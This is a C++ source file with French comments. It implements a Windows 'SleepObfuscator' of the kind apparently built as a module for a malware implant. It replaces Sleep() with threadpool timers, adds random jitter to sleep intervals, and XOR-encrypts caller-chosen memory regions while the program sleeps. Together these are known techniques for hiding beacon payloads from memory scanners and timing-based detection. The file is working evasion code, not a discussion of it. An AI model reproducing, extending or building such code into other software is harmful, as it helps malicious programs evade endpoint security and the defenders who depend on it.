#include "sleep_obfuscation.h"
#include <random>

#ifdef _DEBUG
#include <iostream>
#endif

namespace b21 {

// ===== Constructeur / Destructeur =====

SleepObfuscator::SleepObfuscator()
    : threadPool(nullptr)
    , cleanupGroup(nullptr)
    , initialized(FALSE)
{
    ZeroMemory(&callbackEnviron, sizeof(callbackEnviron));
}

SleepObfuscator::~SleepObfuscator() {
    if (initialized) {
        if (cleanupGroup) {
            CloseThreadpoolCleanupGroupMembers(cleanupGroup, FALSE, nullptr);
            CloseThreadpoolCleanupGroup(cleanupGroup);
            cleanupGroup = nullptr;
        }

        if (threadPool) {
            CloseThreadpool(threadPool);
            threadPool = nullptr;
        }

        DestroyThreadpoolEnvironment(&callbackEnviron);
    }

    if (!encryptionKey.empty()) {
        SecureZeroMemory(encryptionKey.data(), encryptionKey.size());
        encryptionKey.clear();
    }

    initialized = FALSE;
}

// ===== Initialisation =====

BOOL SleepObfuscator::Initialize() {
    if (initialized) {
        return TRUE;
    }

    threadPool = CreateThreadpool(nullptr);
    if (!threadPool) {
        #ifdef _DEBUG
        std::cerr << "[B21] Failed to create thread pool. Error: " << GetLastError() << std::endl;
        #endif
        return FALSE;
    }

    cleanupGroup = CreateThreadpoolCleanupGroup();
    if (!cleanupGroup) {
        #ifdef _DEBUG
        std::cerr << "[B21] Failed to create cleanup group. Error: " << GetLastError() << std::endl;
        #endif
        CloseThreadpool(threadPool);
        threadPool = nullptr;
        return FALSE;
    }

    InitializeThreadpoolEnvironment(&callbackEnviron);
    SetThreadpoolCallbackPool(&callbackEnviron, threadPool);
    SetThreadpoolCallbackCleanupGroup(&callbackEnviron, cleanupGroup, nullptr);

    GenerateEncryptionKey();

    initialized = TRUE;

    #ifdef _DEBUG
    std::cout << "[B21] Sleep obfuscation initialized successfully" << std::endl;
    #endif

    return TRUE;
}

// ===== Sleep obfusqué simple =====

BOOL SleepObfuscator::Sleep(DWORD milliseconds) {
    if (!initialized) {
        #ifdef _DEBUG
        std::cerr << "[B21] Not initialized. Call Initialize() first." << std::endl;
        #endif
        return FALSE;
    }

    HANDLE hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (!hEvent) {
        #ifdef _DEBUG
        std::cerr << "[B21] Failed to create event. Error: " << GetLastError() << std::endl;
        #endif
        return FALSE;
    }

    TimerContext context;
    context.event = hEvent;
    context.completed = FALSE;

    PTP_TIMER timer = CreateThreadpoolTimer(
        TimerCallback,
        &context,
        &callbackEnviron
    );

    if (!timer) {
        #ifdef _DEBUG
        std::cerr << "[B21] Failed to create timer. Error: " << GetLastError() << std::endl;
        #endif
        CloseHandle(hEvent);
        return FALSE;
    }

    ULARGE_INTEGER ulDueTime;
    ulDueTime.QuadPart = -((LONGLONG)milliseconds * 10000LL);

    FILETIME ftDueTime;
    ftDueTime.dwLowDateTime = ulDueTime.LowPart;
    ftDueTime.dwHighDateTime = ulDueTime.HighPart;

    SetThreadpoolTimer(timer, &ftDueTime, 0, 0);

    WaitForSingleObject(hEvent, INFINITE);

    CloseThreadpoolTimer(timer);
    CloseHandle(hEvent);

    return context.completed;
}

// ===== Sleep avec jitter =====

BOOL SleepObfuscator::SleepWithJitter(DWORD baseMilliseconds, FLOAT jitterPercent) {
    if (jitterPercent < 0.0f || jitterPercent > 1.0f) {
        jitterPercent = 0.2f;
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_real_distribution<float> dis(-jitterPercent, jitterPercent);

    FLOAT jitter = dis(gen);
    DWORD adjustedMilliseconds = (DWORD)(baseMilliseconds * (1.0f + jitter));

    #ifdef _DEBUG
    std::cout << "[B21] Sleep with jitter: base=" << baseMilliseconds
              << "ms, jitter=" << (jitter * 100.0f) << "%, final="
              << adjustedMilliseconds << "ms" << std::endl;
    #endif

    return Sleep(adjustedMilliseconds);
}

// ===== Sleep avec chiffrement mémoire =====

BOOL SleepObfuscator::SleepWithEncryption(
    DWORD milliseconds,
    const std::vector<std::pair<PVOID, SIZE_T>>& regions
) {
    if (!initialized) {
        return FALSE;
    }

    #ifdef _DEBUG
    std::cout << "[B21] Sleep with memory encryption: " << regions.size() << " region(s)" << std::endl;
    #endif

    // 1. Chiffrer toutes les régions mémoire
    for (const auto& region : regions) {
        if (!EncryptMemoryRegion(region.first, region.second)) {
            #ifdef _DEBUG
            std::cerr << "[B21] Failed to encrypt region at " << region.first << std::endl;
            #endif

            // En cas d'échec, déchiffrer ce qui a déjà été chiffré
            for (const auto& r : regions) {
                if (r.first == region.first) break;
                DecryptMemoryRegion(r.first, r.second);
            }
            return FALSE;
        }
    }

    // 2. Effectuer le sleep obfusqué
    BOOL result = Sleep(milliseconds);

    // 3. Déchiffrer toutes les régions mémoire
    for (const auto& region : regions) {
        if (!DecryptMemoryRegion(region.first, region.second)) {
            #ifdef _DEBUG
            std::cerr << "[B21] Failed to decrypt region at " << region.first << std::endl;
            #endif
        }
    }

    return result;
}

// ===== Génération de la clé de chiffrement =====

VOID SleepObfuscator::GenerateEncryptionKey() {
    encryptionKey.resize(32); // 256 bits

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);

    for (auto& byte : encryptionKey) {
        byte = static_cast<BYTE>(dis(gen));
    }

    #ifdef _DEBUG
    std::cout << "[B21] Generated 256-bit encryption key" << std::endl;
    #endif
}

// ===== Chiffrement / Déchiffrement mémoire =====

BOOL SleepObfuscator::EncryptMemoryRegion(PVOID address, SIZE_T size) {
    if (!address || size == 0) {
        return FALSE;
    }

    BYTE* data = static_cast<BYTE*>(address);

    for (SIZE_T i = 0; i < size; ++i) {
        data[i] ^= encryptionKey[i % encryptionKey.size()];
    }

    return TRUE;
}

BOOL SleepObfuscator::DecryptMemoryRegion(PVOID address, SIZE_T size) {
    return EncryptMemoryRegion(address, size);
}


VOID CALLBACK SleepObfuscator::TimerCallback(
    PTP_CALLBACK_INSTANCE instance,
    PVOID context,
    PTP_TIMER timer
) {
    UNREFERENCED_PARAMETER(instance);
    UNREFERENCED_PARAMETER(timer);

    if (context) {
        TimerContext* ctx = static_cast<TimerContext*>(context);
        ctx->completed = TRUE;
        SetEvent(ctx->event);
    }
}


SleepObfuscator& GetGlobalSleepObfuscator() {
    static SleepObfuscator instance;
    return instance;
}


BOOL initialize_sleep_obfuscation() {
    return GetGlobalSleepObfuscator().Initialize();
}

BOOL obfuscated_sleep(DWORD milliseconds) {
    SleepObfuscator& obfuscator = GetGlobalSleepObfuscator();

    if (!obfuscator.IsInitialized()) {
        if (!obfuscator.Initialize()) {
            #ifdef _DEBUG
            std::cerr << "[B21] Initialization failed, falling back to Sleep()" << std::endl;
            #endif
            ::Sleep(milliseconds);
            return FALSE;
        }
    }

    return obfuscator.Sleep(milliseconds);
}

BOOL obfuscated_sleep_with_jitter(DWORD baseMilliseconds, FLOAT jitterPercent) {
    SleepObfuscator& obfuscator = GetGlobalSleepObfuscator();

    if (!obfuscator.IsInitialized()) {
        if (!obfuscator.Initialize()) {
            #ifdef _DEBUG
            std::cerr << "[B21] Initialization failed, falling back to Sleep()" << std::endl;
            #endif
            ::Sleep(baseMilliseconds);
            return FALSE;
        }
    }

    return obfuscator.SleepWithJitter(baseMilliseconds, jitterPercent);
}

}
